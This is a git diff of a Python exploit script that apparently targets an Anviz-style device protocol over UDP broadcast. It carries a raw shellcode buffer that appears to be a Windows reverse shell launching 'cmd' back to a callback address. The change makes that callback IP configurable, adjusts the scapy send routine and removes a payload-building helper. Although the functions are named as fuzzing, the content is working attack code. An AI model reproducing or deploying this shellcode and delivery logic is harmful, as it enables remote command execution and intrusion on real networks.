@@ -542,8 +542,20 @@ def sendFuzzingUDPBroadcast(ip="255.255.255.255", sport=5050, dport=5060):
     buf += b"\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff\xd5\xb8"
     buf += b"\x90\x01\x00\x00\x29\xc4\x54\x50\x68\x29\x80\x6b\x00"
     buf += b"\xff\xd5\x50\x50\x50\x50\x40\x50\x40\x50\x68\xea\x0f"
-    buf += b"\xdf\xe0\xff\xd5\x97\x6a\x05\x68\xc0\xa8\x0b\x01\x68" # xc0\xa8\x0b\x01 IP
-    buf += b"\x02\x00\x01\xbd\x89\xe6\x6a\x10\x56\x57\x68\x99\xa5"
+    buf += b"\xdf\xe0\xff\xd5\x97\x6a\x05\x68"
+
+    # buf += "\xc0\xa8\x0b\x01" # xc0\xa8\x0b\x01 IP
+
+    a = ip.split('.')
+    b = '{:02X}{:02X}{:02X}{:02X}'.format(*map(int, a))
+    lhost = binascii.unhexlify(b)
+
+    print(lhost)
+
+    buf += lhost
+
+
+    buf += b"\x68\x02\x00\x01\xbd\x89\xe6\x6a\x10\x56\x57\x68\x99\xa5"
     buf += b"\x74\x61\xff\xd5\x85\xc0\x74\x0c\xff\x4e\x08\x75\xec"
     buf += b"\x68\xf0\xb5\xa2\x56\xff\xd5\x68\x63\x6d\x64\x00\x89"
     buf += b"\xe3\x57\x57\x57\x31\xf6\x6a\x12\x59\x56\xe2\xfd\x66"
@@ -556,33 +568,7 @@ def sendFuzzingUDPBroadcast(ip="255.255.255.255", sport=5050, dport=5060):
 
     request += buf
 
-    scapy.all.sendp( Ether(src='00:22:ca:88:a5:d0', dst="ff:ff:ff:ff:ff:ff")/IP(src='192.168.11.1',dst=ip)/UDP(sport=sport,dport=dport)/Raw(load=request),  iface="vmnet4" )
-
-def makeFuzzPayload(buffer, data=b'', CH=b"\x00\x00\x00\x00"):
-    if len(data) < 0x190:
-
-        ACK = b"\xFF"
-        RET = b"\x00"
-
-        # Fix size for data 2 bytes
-        # size = len(data)
-        size = len(buffer)
-        size2b = bytes.fromhex(format(size, '#06x').replace("0x", ""))
-
-        request = buffer + STX + CH + ACK + RET + size2b
-        if size > 0x00:  # Aditional data in channel
-            request = request + data
-
-        # Add CRC16
-        CRC = anvizCRC.calculateRevAnvizCRC(request)
-        b = struct.pack(">H", CRC)
-        request = request + b
-
-        #print("[*] CRC: %s " % binascii.hexlify(request))
-
-        return request
-    else:
-        raise Exception('Data size too big')
+    scapy.all.sendp( Ether(src='00:22:ca:88:a5:d0', dst="ff:ff:ff:ff:ff:ff")/IP(src=ip,dst='255.255.255.255')/UDP(sport=sport,dport=dport)/Raw(load=request),  iface="vmnet4" )
 
 def setFuzzUDPServer(ip='', port=5050, timeout=150):
     # Datagram (udp) socket
@@ -593,7 +579,7 @@ def setFuzzUDPServer(ip='', port=5050, timeout=150):
 
     # Bind socket to local ip and port
     try:
-    	s.bind((ip, port))
+    	s.bind(('', port))
     except:
     	print('[*] Server socket bind failed')
     	sys.exit()
@@ -608,7 +594,7 @@ def setFuzzUDPServer(ip='', port=5050, timeout=150):
         try:
             response = s.recvfrom(1024)
             print(response)
-            sendFuzzingUDPBroadcast()
+            sendFuzzingUDPBroadcast(ip=ip)
             response = s.recvfrom(1024)
         except socket.timeout:
             print("[!] Error with UDP server")
@@ -616,5 +602,5 @@ def setFuzzUDPServer(ip='', port=5050, timeout=150):
     s.close()
     return responses
 
-def fuzzDevice():
-    setFuzzUDPServer()
+def fuzzDevice(ip):
+    setFuzzUDPServer(ip=ip)
